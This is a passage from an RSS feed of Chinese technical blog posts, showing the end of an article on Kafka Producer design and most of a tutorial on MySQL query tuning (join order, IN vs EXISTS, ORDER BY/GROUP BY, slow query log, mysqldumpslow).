&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;86dbd682ef1e76bdeeefd70941d385f3&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;0f3f10e9bed1c82c5e32ebeb9a4c7e72&quot;&gt;接下来是独立的Sender线程负责从缓冲中获取足量的数据调用 Network Client 封装层去真正发送数据，这里使用了 Java8 的 NIO 网络模型发送数据。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;3f27dde20e00c3a3efaeb92abeaf536a&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;882de77a5931c77c51dbadc71fd10bff&quot;&gt;可以看到整个逻辑的关键点在于 RecordAccumulator 如何进行消息缓存，一般的成熟框架和中间件中都会有一套自己的内存管理机制，比如 Netty 也有一套复杂而又精妙的内存管理抽象层，这里的缓冲区也是一样的道理，主要需要去看看 Kafka 如何去做内存管理。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;b2cead8ae70b3637ac188cc78ff4b27c&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;f78761d7231f14418fc7882c29f9b8a4&quot;&gt;另外需要关注 Sender 从缓冲里以什么样的逻辑获取数据，来达到尽量少的网络交互发送尽量多的数据。还有网络失败又是如何保证数据的可靠性的。这个地方也是我们的设计和官方实现的差距，对于网络 I/O 的精心优化。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;13f3f58bcd4d38fac0d885be4c152d2e&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;de8189dbfcbce6e4e10d762a29c162b6&quot;&gt;目前的篇幅已经比较长了，为了大家方便阅读理解，本篇主要从和大家一起思考如何设计一个 Kafka Producer 以及官方是如何实现的，我们之间的差距是什么，更需要关注的点是什么。通过自己的思考和对比更加能认识到不足学习到新的点！&lt;/p&gt;
&lt;p data-lake-id=&quot;39791bd66a60f029749ea37f3297ff4b&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;y1rVx&quot; data-lake-id=&quot;79616a4246a061aaf6a606699d028dc7&quot;&gt;尾声（唠叨）&lt;/h2&gt;
&lt;p data-lake-id=&quot;2dc6d54100fe749aade6c14207d3024d&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;73016d42c77196d6cc7b18bb182a0eb8&quot;&gt;这篇文章从周内就开始了，后面断断续续每天写了点，只是每天回去的确实有点晚，偶尔还给我整个失眠，精神状态不太好，周五六点多饭都没吃直接回家睡觉了，确实好困，希望下周能休息好。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;288db84b6b7cca7fa0b6932672a27e0f&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;b2afbfe0c92f35961ebfe25d6709f334&quot;&gt;这周的工作压力也很大，主要是需要推动很多上下游协同，还需要定方案。经常在想怎么交涉？怎么修改方案大家会认同？怎样说服他们？ 是压力也是锻炼，说明这方面欠缺的较多，该补！&lt;/p&gt;
&lt;p data-lake-id=&quot;3d02af81231693cf9855e2de466a43fc&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;50cd963430134d59510f6f418c853aef&quot;&gt;下篇文章主要会写 KafkaProducer 的缓存内存管理机制，Meta 信息更新机制，以及网络 I/O 模型的设计。敬请期待~&lt;/p&gt;
&lt;p data-lake-id=&quot;42236161bec2033e945d34b3bb6ccc7c&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;0c55841670957e9f64c4f0dfabb51c75&quot;&gt;另外：大家也可以关注下我的微信公众号哦~ 技术分享和个人思考都会第一时间同步！&lt;/p&gt;
&lt;p data-lake-id=&quot;c4d0e71d16976af0bf3309d872869368&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2021%2Fpng%2F171275%2F1610289331606-52e03a47-f431-4b20-8b57-6a4cc0f70345.png%22%2C%22originWidth%22%3A430%2C%22originHeight%22%3A430%2C%22name%22%3A%22image.png%22%2C%22size%22%3A69429%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A430%2C%22height%22%3A430%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/171275/1610289331606-52e03a47-f431-4b20-8b57-6a4cc0f70345.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;430px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 19 Jan 2021 15:09:00 +0000</pubDate>
<dc:creator>徐笔笔</dc:creator>
<og:description>这个 Kafka 的专题，我会从系统整体架构，设计到代码落地。和大家一起杠源码，学技巧，涨知识。希望大家持续关注一起见证成长！ 我相信：技术的道路，十年如一日！十年磨一剑！ 往期文章 Kafka 探险</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/lwen/p/14300608.html</dc:identifier>
</item>
<item>
<title>MySQL查询截取分析 - MXC肖某某</title>
<link>http://www.cnblogs.com/bbgs-xc/p/14293709.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bbgs-xc/p/14293709.html</guid>
<description>&lt;h2&gt;&lt;span&gt;一、查询优化&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;1，mysql的调优大纲&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;&lt;strong&gt;慢查询的开启&lt;/strong&gt;并捕获&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;explain&lt;/strong&gt;+慢SQL分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;show profile&lt;/strong&gt;查询SQL在Mysql服务器里面的执行细节和生命周期情况&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;SQL数据库服务器的&lt;strong&gt;参数调优&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;&lt;span&gt;2，小表驱动大表&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　mysql的join实现原理是，&lt;strong&gt;以驱动表的数据为基础&lt;/strong&gt;，“嵌套循环”去被驱动表匹配记录。驱动表的索引会失效，而被驱动表的索引有效。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#假设 a表10000数据，b表20数据
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; a &lt;span&gt;join&lt;/span&gt; b &lt;span&gt;on&lt;/span&gt; a.bid &lt;span&gt;=&lt;/span&gt;b.id
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;a表驱动b表为:
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;  20条数据
   匹配10000数据（根据on a.bid&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;b.id的连接条件，进行B&lt;span&gt;+&lt;/span&gt;&lt;span&gt;树查找）
&lt;strong&gt;查找次数&lt;/strong&gt;为:20+ log10000&lt;br/&gt;b表驱动a表为
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; 10000条数据
    匹配20条数据（根据on a.bid&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;b.id的连接条件，进行B&lt;span&gt;+&lt;/span&gt;树查找）&lt;br/&gt;&lt;strong&gt;查找次数&lt;/strong&gt;为:10000+ log20
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;3，in和exists&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　exists的使用&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;EXISTS 语法：EXISTS(subquery) 只&lt;strong&gt;返回TRUE或FALSE&lt;/strong&gt;，因此子查询中的&lt;strong&gt;&lt;code&gt;SELECT *&lt;/code&gt;也可以是&lt;code&gt;SELECT 1&lt;/code&gt;&lt;/strong&gt;或其他，官方说法是实际执行时会忽略SELECT清单，因此没有区别&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;&lt;code&gt;SELECT ... FROM table WHERE EXISTS(subquery)&lt;/code&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;该语法可以理解为：将查询的数据，放到子查询中做条件验证，根据&lt;strong&gt;验证结果（TRUE或FALSE）来决定主查询的数据结果是否得以保留&lt;/strong&gt;。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;EXISTS子查询的实际执行过程可能经过了优化而不是我们理解上的逐条对比，如果担忧效率问题，可进行实际检验以确定是否有效率问题。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;EXISTS子查询往往也可以用条件表达式、其他子查询或者JOIN来替代，何种最优需要具体问题具体分析&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#采用in则是，内表B驱动外表A
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; A &lt;span&gt;where&lt;/span&gt; id &lt;span&gt;in&lt;/span&gt; (&lt;span&gt;select&lt;/span&gt; id &lt;span&gt;from&lt;/span&gt;&lt;span&gt; B)
#采用exists则是，外表A驱动内表B
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; A &lt;span&gt;where&lt;/span&gt; &lt;span&gt;exists&lt;/span&gt;(&lt;span&gt;select&lt;/span&gt; &lt;span&gt;1&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; B &lt;span&gt;where&lt;/span&gt; B.id &lt;span&gt;=&lt;/span&gt; A.id)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　结论：&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;永远记住&lt;strong&gt;小表驱动大表&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;当 B 表数据集小于 A 表数据集时，使用 in&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;当 A 表数据集小于 B 表数据集时，使用 exist&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;&lt;span&gt;4，order by&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span&gt;创建表&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;create&lt;/span&gt; &lt;span&gt;table&lt;/span&gt;&lt;span&gt; tblA(
    #id &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; &lt;span&gt;primary&lt;/span&gt; &lt;span&gt;key&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt; auto_increment,
    age &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;,
    birth &lt;/span&gt;&lt;span&gt;timestamp&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;
);

&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; tblA(age, birth) &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;22&lt;/span&gt;&lt;span&gt;, now());
&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; tblA(age, birth) &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;23&lt;/span&gt;&lt;span&gt;, now());
&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; tblA(age, birth) &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;24&lt;/span&gt;&lt;span&gt;, now());
#创建复合索引
&lt;/span&gt;&lt;span&gt;create&lt;/span&gt; &lt;span&gt;index&lt;/span&gt; idx_A_ageBirth &lt;span&gt;on&lt;/span&gt; tblA(age, birth);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210118145923361-557241143.png&quot; width=&quot;1000&quot; height=&quot;108&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;order by命中索引的情况&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210118150601374-429662641.png&quot; width=&quot;1000&quot; height=&quot;525&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;order by未命中索引的情况&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210118152436332-287601785.png&quot; width=&quot;1000&quot; height=&quot;273&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;结论：&lt;/span&gt;&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;MySQL支持两种排序方式：Using index和Using filesort。filesort效率较低，而要使用index方式排序需满足两种使用条件尽可能在索引列上完成排序操作，遵照索引的最佳左前缀&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;&lt;strong&gt;order by语句自身使用索引的最左前列&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;使用where子句与order by子句条件列组合满足最左前列&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;如果order by不在索引列上，会使用filesort算法：&lt;strong&gt;双路排序和单路排序&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;span&gt;MySQL4.1之前是使用双路排序，字面意思是&lt;strong&gt;两次扫描磁盘&lt;/strong&gt;，最终得到数据。&lt;strong&gt;读取行指针&lt;/strong&gt;和&lt;strong&gt;order by列&lt;/strong&gt;，对他们进行排序，然后扫描已经排序好的列表，按照列表中的值&lt;strong&gt;重新从列表中读取对应的数据传输&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;span&gt;从磁盘读取&lt;strong&gt;查询需要的所有列&lt;/strong&gt;，按照order by列&lt;strong&gt;在buffer对它们进行排序&lt;/strong&gt;，然后扫描排序后的列表进行输出，它的&lt;strong&gt;效率更快&lt;/strong&gt;一些，避免了第二次读取数据，并且把随机IO变成顺序IO，但是它会使用更多的空间，因为它把每一行都保存在内存中了。&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;-0.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; &lt;span&gt;user&lt;/span&gt; &lt;span&gt;where&lt;/span&gt; name &lt;span&gt;=&lt;/span&gt; &quot;zs&quot; &lt;span&gt;order&lt;/span&gt; &lt;span&gt;by&lt;/span&gt;&lt;span&gt; age
#双路排序
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;)从 name 找到第一个满足 name &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;zs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; 的主键id
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;)根据主键 id 取出整行，把排序字段 age 和主键 id 这两个字段放到 sort buffer(排序缓存) 中
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;)从name 取下一个满足 name &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;zs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; 记录的主键 id
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;)重复 &lt;span&gt;2&lt;/span&gt;、&lt;span&gt;3&lt;/span&gt; 直到不满足 name &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;zs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt;&lt;span&gt;)对 sort_buffer 中的字段 age 和主键 id 按照字段 age进行排序
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;)遍历排序好的 id 和字段 age ，按照 id 的值回到原表中取出 所有字段的值返回给客户端

#单路排序
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;)从name找到第一个满足 name &lt;span&gt;=&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;zs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; 条件的主键 id
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;)根据主键 id 取出整行，取出所有字段的值，存入 sort_buffer(排序缓存)中
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;)从索引name找到下一个满足 name &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;zs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; 条件的主键 id
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;)重复步骤 &lt;span&gt;2&lt;/span&gt;、&lt;span&gt;3&lt;/span&gt; 直到不满足 name &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;zs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt;)对 sort_buffer 中的数据按照字段 age 进行排序，返回结果给客户端
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;单路排序的问题及优化 &lt;/span&gt;&lt;/li&gt;
&lt;li readability=&quot;-0.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;问题：
    由于单路是改进的算法，总体而言好过双路
    在sort_buffer中，方法B比方法A要多占用很多空间，因为方法B是把所有字段都取出，所以有可能取出的数据的总大小超出了sort_buffer的容量，导致每次只能取sort_buffer容量大小的数据，进行排序（创建tmp文件，多路合并），排完再取取sort_buffer容量大小，再排…… 从而会导致多次I&lt;/span&gt;/&lt;span&gt;O。
优化策略：
    增大&lt;strong&gt;&lt;span&gt;sort_buffer_size&lt;/span&gt;&lt;/strong&gt;参数的设置
    增大&lt;span&gt;&lt;strong&gt;max_length_for_sort_data&lt;/strong&gt;&lt;/span&gt;参数的设置
注意事项:
　　&lt;span&gt;&lt;strong&gt;Order by&lt;/strong&gt;&lt;/span&gt;时&lt;span&gt;&lt;strong&gt;select &lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;*是一个大忌，只Query需要的字段&lt;/strong&gt;&lt;/span&gt;。因为字段越多在内存中存储的数据也就也多，这样就导致每次I/O能加载的数据列越少。
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;&lt;span&gt;5，group by优化&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1)group&lt;/span&gt;&lt;span&gt; by实质是先排序后进行分组，遵照索引的最佳左前缀
2)当无法使用索引列，增大max_length_for_sort_data参数的设置&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;增大sort_buffer_size参数的设置
3)where高于having，&lt;span&gt;&lt;strong&gt;能写在where限定的条件就不要去having限定&lt;/strong&gt;&lt;/span&gt;了
4)其余的规则均和 &lt;/span&gt;&lt;span&gt;order&lt;/span&gt; &lt;span&gt;by&lt;/span&gt; 一致
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;二、慢查询日志&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;1，慢查询日志是什么?&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中&lt;strong&gt;响应时间超过阀值的语句&lt;/strong&gt;，具体指运行时间超过&lt;strong&gt;long_query_time&lt;/strong&gt;值的SQL，则会被记录到慢查询日志中。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;long_query_time的&lt;strong&gt;默认值为10&lt;/strong&gt;，意思是运行10秒以上的SQL语句会被记录下来&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;由他来查看哪些SQL超出了我们的最大忍耐时间值，比如一条sql执行超过5秒钟，我们就算慢SQL，希望能收集超过5秒的sql，结合之前explain进行全面分析。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;&lt;span&gt;2，慢查询日志的开启&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　默认情况下，MySQL的&lt;strong&gt;慢查询日志是没有开启&lt;/strong&gt;的。如果不是调优需要的话，一般不建议启动该参数，因为&lt;strong&gt;开启慢查询日志会影响到性能&lt;/strong&gt;，慢查询日志支持将日志记录&lt;strong&gt;写入文件&lt;/strong&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;a）开启慢查询日志&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#查看是否开启慢日志
show variables like &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;slow_query_log%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
#开启慢查询日志，想要永久有效在my.cnf中设置
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; &lt;span&gt;global&lt;/span&gt; slow_query_log = &lt;span&gt;1&lt;/span&gt;&lt;span&gt; ;&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210119203123900-1576123934.png&quot; width=&quot;550&quot; height=&quot;306&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;b）设置慢查询日志的阈值&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#查看慢查询日志的阈值时间  默认为10s
show variables like &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;long_query_time%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
#设置为3s 重启失效，想要永久有效在my.cnf中设置
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; &lt;span&gt;global&lt;/span&gt; long_query_time = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;
#再次查看，需要切换窗口查看
show variables like &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;long_query_time%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210119203513680-482609677.png&quot; width=&quot;550&quot; height=&quot;186&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;c）持久化慢查询日志和时间阈值&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;[mysqld]
#持久化慢查询日志
slow_query_log&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;；
slow_query_log_file&lt;/span&gt;=/&lt;span&gt;var&lt;/span&gt;/lib/mysql/hadoop102-&lt;span&gt;slow.log
long_query_time&lt;/span&gt;=&lt;span&gt;3&lt;/span&gt;&lt;span&gt;；
log_output&lt;/span&gt;=FILE
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;&lt;span&gt;d）慢查询案例&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#查询等待4s
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; sleep(&lt;span&gt;4&lt;/span&gt;); 
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#在linux系统中，查看慢查询日志
cat &lt;/span&gt;/&lt;span&gt;var&lt;/span&gt;/lib/mysql/hadoop102-slow.log
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;&lt;span&gt;e）查看当前系统中存在的慢查询日志条数&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
show &lt;span&gt;global&lt;/span&gt; status like &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%Slow_queries%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;3，日志分析命令mysqldumpslow&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span&gt;a）参数解释&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;-s：是表示按何种方式排序
 c：访问次数
 l：锁定时间
 r：返回记录
 t：查询时间
 al：平均锁定时间
 ar：平均返回记录数
 at：平均查询时间
-t：即为返回前面多少条的数据
-g：后边搭配一个正则匹配模式，大小写不敏感的&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;&lt;span&gt;b）常用方法&lt;/span&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#得到返回记录集最多的10个SQL
mysqldumpslow &lt;/span&gt;-s r -t &lt;span&gt;10&lt;/span&gt; /&lt;span&gt;var&lt;/span&gt;/lib/mysql/hadoop102-&lt;span&gt;slow.log
#得到访问次数最多的10个SQL
mysqldumpslow &lt;/span&gt;-s c -t &lt;span&gt;10&lt;/span&gt; /&lt;span&gt;var&lt;/span&gt;/lib/mysql/hadoop102-&lt;span&gt;slow.log
#得到按照时间排序的前10条里面含有左连接的查询语句
mysqldumpslow &lt;/span&gt;-s t -t &lt;span&gt;10&lt;/span&gt; -g &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;left join&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&lt;span&gt;var&lt;/span&gt;/lib/mysql/hadoop102-&lt;span&gt;slow.log
#这些命令时结合 &lt;/span&gt;|&lt;span&gt; 和more使用
mysqldumpslow &lt;/span&gt;-s r -t &lt;span&gt;10&lt;/span&gt; /&lt;span&gt;var&lt;/span&gt;/lib/mysql/hadoop102-slow.log | more
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;三、批量写数据脚本&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;1，建表&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38.5&quot;&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_025481a5-23a8-4954-aabb-6d620030aa09&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_025481a5-23a8-4954-aabb-6d620030aa09&quot; class=&quot;code_img_opened&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_025481a5-23a8-4954-aabb-6d620030aa09&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;72&quot;&gt;
&lt;pre&gt;
